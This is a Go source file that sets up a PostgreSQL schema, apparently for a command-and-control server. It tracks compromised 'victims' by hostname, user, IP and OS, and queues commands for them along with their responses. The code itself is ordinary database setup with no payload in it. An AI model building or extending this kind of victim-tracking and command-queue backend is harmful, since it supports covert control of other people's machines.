package database

import (
	"database/sql"
	"fmt"
	"log"

	_ "github.com/lib/pq"
)

type PostgresDB struct {
	*sql.DB
}

func InitPostgres(connStr string) (*PostgresDB, error) {
	log.Println("[DB] Connecting to PostgreSQL...")
	
	db, err := sql.Open("postgres", connStr)
	if err != nil {
		return nil, fmt.Errorf("failed to open database: %w", err)
	}

	// Test connection
	if err := db.Ping(); err != nil {
		return nil, fmt.Errorf("failed to ping database: %w", err)
	}
	log.Println("[✓] PostgreSQL connection established")

	log.Println("[DB] Creating tables if not exist...")
	if err := createTables(db); err != nil {
		return nil, fmt.Errorf("failed to create tables: %w", err)
	}
	log.Println("[✓] Database schema initialized")

	return &PostgresDB{db}, nil
}

func createTables(db *sql.DB) error {
	schema := `
		CREATE TABLE IF NOT EXISTS users (
			id VARCHAR(255) PRIMARY KEY,
			username VARCHAR(255) UNIQUE NOT NULL,
			password_hash TEXT NOT NULL,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		);

		CREATE TABLE IF NOT EXISTS victims (
			id VARCHAR(255) PRIMARY KEY,
			hostname VARCHAR(255),
			username VARCHAR(255),
			ip_address VARCHAR(50),
			os VARCHAR(100),
			architecture VARCHAR(50),
			first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			status VARCHAR(50) DEFAULT 'online',
			extra_data JSONB
		);

		CREATE TABLE IF NOT EXISTS commands (
			id SERIAL PRIMARY KEY,
			victim_id VARCHAR(255) REFERENCES victims(id) ON DELETE CASCADE,
			command TEXT NOT NULL,
			response TEXT,
			sent_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			responded_at TIMESTAMP,
			status VARCHAR(50) DEFAULT 'pending'
		);

		CREATE INDEX IF NOT EXISTS idx_victims_status ON victims(status);
		CREATE INDEX IF NOT EXISTS idx_commands_victim ON commands(victim_id);
		CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);
	`

	_, err := db.Exec(schema)
	return err
}
